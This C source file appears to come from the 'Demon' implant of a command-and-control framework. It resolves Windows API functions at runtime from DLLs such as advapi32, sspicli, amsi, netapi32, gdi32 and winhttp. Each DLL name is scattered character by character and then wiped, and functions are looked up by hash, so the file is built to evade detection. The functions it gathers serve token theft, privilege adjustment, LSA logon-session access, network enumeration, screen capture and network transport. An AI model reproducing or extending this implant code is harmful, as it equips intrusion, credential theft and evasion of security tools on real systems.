#include <Demon.h>
#include <Core/Runtime.h>
#include <Core/MiniStd.h>


BOOL RtAdvapi32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 0  ] = HideChar('A');
    ModuleName[ 2  ] = HideChar('V');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 12 ] = HideChar('\0');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 7  ] = HideChar('2');
    ModuleName[ 1  ] = HideChar('D');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 5  ] = HideChar('I');
    ModuleName[ 4  ] = HideChar('P');

    if ( ( Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.GetTokenInformation          = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
        Instance.Win32.CreateProcessWithTokenW      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
        Instance.Win32.CreateProcessWithLogonW      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CREATEPROCESSWITHLOGONW );
        Instance.Win32.RevertToSelf                 = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_REVERTTOSELF );
        Instance.Win32.GetUserNameA                 = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETUSERNAMEA );
        Instance.Win32.LogonUserW                   = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOGONUSERW );
        Instance.Win32.LookupPrivilegeValueA        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGEVALUEA );
        Instance.Win32.LookupAccountSidA            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDA );
        Instance.Win32.LookupAccountSidW            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDW );
        Instance.Win32.OpenThreadToken              = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_OPENTHREADTOKEN );
        Instance.Win32.OpenProcessToken             = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_OPENPROCESSTOKEN );
        Instance.Win32.AdjustTokenPrivileges        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ADJUSTTOKENPRIVILEGES );
        Instance.Win32.LookupPrivilegeNameA         = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGENAMEA );
        Instance.Win32.SystemFunction032            = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
        Instance.Win32.FreeSid                      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_FREESID );
        Instance.Win32.SetSecurityDescriptorSacl    = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORSACL );
        Instance.Win32.SetSecurityDescriptorDacl    = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORDACL );
        Instance.Win32.InitializeSecurityDescriptor = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_INITIALIZESECURITYDESCRIPTOR );
        Instance.Win32.AddMandatoryAce              = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ADDMANDATORYACE );
        Instance.Win32.InitializeAcl                = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_INITIALIZEACL );
        Instance.Win32.AllocateAndInitializeSid     = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_ALLOCATEANDINITIALIZESID );
        Instance.Win32.CheckTokenMembership         = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CHECKTOKENMEMBERSHIP );
        Instance.Win32.SetEntriesInAclW             = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETENTRIESINACLW );
        Instance.Win32.SetThreadToken               = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_SETTHREADTOKEN );
        Instance.Win32.LsaNtStatusToWinError        = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_LSANTSTATUSTOWINERROR );
        Instance.Win32.EqualSid                     = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_EQUALSID );
        Instance.Win32.ConvertSidToStringSidW       = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_CONVERTSIDTOSTRINGSIDW );
        Instance.Win32.GetSidSubAuthorityCount      = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITYCOUNT );
        Instance.Win32.GetSidSubAuthority           = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITY );

        PUTS( "Loaded Advapi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Advapi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtMscoree(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 2  ] = HideChar('C');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 0  ] = HideChar('M');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('E');
    ModuleName[ 4  ] = HideChar('R');
    ModuleName[ 6  ] = HideChar('E');
    ModuleName[ 3  ] = HideChar('O');

    if ( ( Instance.Modules.Mscoree = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );

        PUTS( "Loaded Mscoree functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Mscoree" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtOleaut32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 2  ] = HideChar('E');
    ModuleName[ 0  ] = HideChar('O');
    ModuleName[ 1  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('T');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('2');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 4  ] = HideChar('U');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 8  ] = HideChar('.');

    if ( ( Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.SafeArrayAccessData   = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
        Instance.Win32.SafeArrayUnaccessData = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
        Instance.Win32.SafeArrayCreate       = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYCREATE );
        Instance.Win32.SafeArrayPutElement   = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYPUTELEMENT );
        Instance.Win32.SafeArrayCreateVector = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYCREATEVECTOR );
        Instance.Win32.SafeArrayDestroy      = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYDESTROY );
        Instance.Win32.SysAllocString        = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SYSALLOCSTRING );

        PUTS( "Loaded Oleaut32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Oleaut32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtUser32(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 0  ] = HideChar('U');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');
    ModuleName[ 5  ] = HideChar('2');
    ModuleName[ 3  ] = HideChar('R');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('E');
    ModuleName[ 4  ] = HideChar('3');

    if ( ( Instance.Modules.User32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.ShowWindow       = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_SHOWWINDOW );
        Instance.Win32.GetSystemMetrics = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETSYSTEMMETRICS );
        Instance.Win32.GetDC            = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETDC );
        Instance.Win32.ReleaseDC        = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_RELEASEDC );

        PUTS( "Loaded User32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load User32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtShell32(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('S');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 6  ] = HideChar('2');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 4  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('H');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('3');
    ModuleName[ 3  ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('E');

    if ( ( Instance.Modules.Shell32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.CommandLineToArgvW = LdrFunctionAddr( Instance.Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );

        PUTS( "Loaded Shell32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Shell32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtMsvcrt(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 0  ] = HideChar('M');
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('R');
    ModuleName[ 2  ] = HideChar('V');
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');
    ModuleName[ 3  ] = HideChar('C');
    ModuleName[ 5  ] = HideChar('T');
    ModuleName[ 1  ] = HideChar('S');

    if ( ( Instance.Modules.Msvcrt = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.vsnprintf  = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_VSNPRINTF );
        Instance.Win32.swprintf_s = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_SWPRINTF_S );

        PUTS( "Loaded Msvcrt functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Msvcrt" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtIphlpapi(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 0  ] = HideChar('I');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('H');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 6  ] = HideChar('P');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('P');
    ModuleName[ 3  ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 5  ] = HideChar('A');
    ModuleName[ 4  ] = HideChar('P');
    ModuleName[ 7  ] = HideChar('I');

    if ( ( Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );

        PUTS( "Loaded Iphlpapi functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Iphlpapi" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtGdi32(
    VOID
) {
    CHAR ModuleName[ 10 ] = { 0 };

    ModuleName[ 4 ] = HideChar('2');
    ModuleName[ 6 ] = HideChar('D');
    ModuleName[ 5 ] = HideChar('.');
    ModuleName[ 8 ] = HideChar('L');
    ModuleName[ 2 ] = HideChar('I');
    ModuleName[ 1 ] = HideChar('D');
    ModuleName[ 7 ] = HideChar('L');
    ModuleName[ 9 ] = HideChar(0);
    ModuleName[ 0 ] = HideChar('G');
    ModuleName[ 3 ] = HideChar('3');

    if ( ( Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.GetCurrentObject   = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
        Instance.Win32.GetObjectW         = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETOBJECTW );
        Instance.Win32.CreateCompatibleDC = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_CREATECOMPATIBLEDC );
        Instance.Win32.CreateDIBSection   = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_CREATEDIBSECTION );
        Instance.Win32.SelectObject       = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_SELECTOBJECT );
        Instance.Win32.BitBlt             = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_BITBLT );
        Instance.Win32.DeleteObject       = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_DELETEOBJECT );
        Instance.Win32.DeleteDC           = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_DELETEDC );

        PUTS( "Loaded Gdi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Gdi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtNetApi32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 0  ] = HideChar('N');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 2  ] = HideChar('T');
    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 4  ] = HideChar('P');
    ModuleName[ 5  ] = HideChar('I');
    ModuleName[ 1  ] = HideChar('E');
    ModuleName[ 7  ] = HideChar('2');

    if ( ( Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
        Instance.Win32.NetGroupEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETGROUPENUM );
        Instance.Win32.NetUserEnum       = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETUSERENUM );
        Instance.Win32.NetWkstaUserEnum  = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETWKSTAUSERENUM );
        Instance.Win32.NetSessionEnum    = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETSESSIONENUM );
        Instance.Win32.NetShareEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETSHAREENUM );
        Instance.Win32.NetApiBufferFree  = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETAPIBUFFERFREE );

        PUTS( "Loaded NetApi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load NetApi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtWs2_32(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 0  ] = HideChar('W');
    ModuleName[ 2  ] = HideChar('2');
    ModuleName[ 4  ] = HideChar('3');
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 3  ] = HideChar('_');
    ModuleName[ 5  ] = HideChar('2');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');

    if ( ( Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.WSAStartup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASTARTUP );
        Instance.Win32.WSACleanup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSACLEANUP );
        Instance.Win32.WSASocketA      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASOCKETA );
        Instance.Win32.WSAGetLastError = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSAGETLASTERROR );
        Instance.Win32.ioctlsocket     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_IOCTLSOCKET );
        Instance.Win32.bind            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_BIND );
        Instance.Win32.listen          = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_LISTEN );
        Instance.Win32.accept          = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_ACCEPT );
        Instance.Win32.closesocket     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_CLOSESOCKET );
        Instance.Win32.recv            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_RECV );
        Instance.Win32.send            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_SEND );
        Instance.Win32.connect         = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_CONNECT );
        Instance.Win32.getaddrinfo     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_GETADDRINFO );
        Instance.Win32.freeaddrinfo    = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_FREEADDRINFO );

        PUTS( "Loaded Ws2_32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Ws2_32" )
        return FALSE;
    }

    return TRUE;
}


BOOL RtSspicli(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('S');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 6  ] = HideChar('I');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 5  ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 2  ] = HideChar('P');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('C');
    ModuleName[ 3  ] = HideChar('I');

    if ( ( Instance.Modules.Sspicli = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
        Instance.Win32.LsaLookupAuthenticationPackage = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
        Instance.Win32.LsaDeregisterLogonProcess      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSADEREGISTERLOGONPROCESS );
        Instance.Win32.LsaConnectUntrusted            = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSACONNECTUNTRUSTED );
        Instance.Win32.LsaFreeReturnBuffer            = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAFREERETURNBUFFER );
        Instance.Win32.LsaCallAuthenticationPackage   = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSACALLAUTHENTICATIONPACKAGE );
        Instance.Win32.LsaGetLogonSessionData         = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAGETLOGONSESSIONDATA );
        Instance.Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );

        PUTS( "Loaded Sspicli functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Sspicli" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtAmsi(
    VOID
) {
    CHAR ModuleName[ 9 ] = { 0 };

    ModuleName[ 3 ] = HideChar('I');
    ModuleName[ 5 ] = HideChar('D');
    ModuleName[ 7 ] = HideChar('L');
    ModuleName[ 8 ] = HideChar(0);
    ModuleName[ 6 ] = HideChar('L');
    ModuleName[ 4 ] = HideChar('.');
    ModuleName[ 0 ] = HideChar('A');
    ModuleName[ 1 ] = HideChar('M');
    ModuleName[ 2 ] = HideChar('S');

    if ( ( Instance.Modules.Amsi = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.AmsiScanBuffer = LdrFunctionAddr( Instance.Modules.Amsi, H_FUNC_AMSISCANBUFFER );

        PUTS( "Loaded Amsi functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Amsi" )
        return FALSE;
    }

    return TRUE;
}

#ifdef TRANSPORT_HTTP
BOOL RtWinHttp(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('W');
    ModuleName[ 2  ] = HideChar('N');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('T');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 1  ] = HideChar('I');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 6  ] = HideChar('P');
    ModuleName[ 3  ] = HideChar('H');
    ModuleName[ 5  ] = HideChar('T');

    if ( ( Instance.Modules.WinHttp = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        Instance.Win32.WinHttpOpen                           = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPEN );
        Instance.Win32.WinHttpConnect                        = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
        Instance.Win32.WinHttpOpenRequest                    = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
        Instance.Win32.WinHttpSetOption                      = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSETOPTION );
        Instance.Win32.WinHttpCloseHandle                    = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCLOSEHANDLE );
        Instance.Win32.WinHttpSendRequest                    = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSENDREQUEST );
        Instance.Win32.WinHttpAddRequestHeaders              = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPADDREQUESTHEADERS );
        Instance.Win32.WinHttpReceiveResponse                = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPRECEIVERESPONSE );
        Instance.Win32.WinHttpReadData                       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPREADDATA );
        Instance.Win32.WinHttpQueryHeaders                   = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPQUERYHEADERS );
        Instance.Win32.WinHttpGetIEProxyConfigForCurrentUser = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER );
        Instance.Win32.WinHttpGetProxyForUrl                 = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPGETPROXYFORURL );

        PUTS( "Loaded WinHttp functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load WinHttp" )
        return FALSE;
    }

    return TRUE;
}
#endif
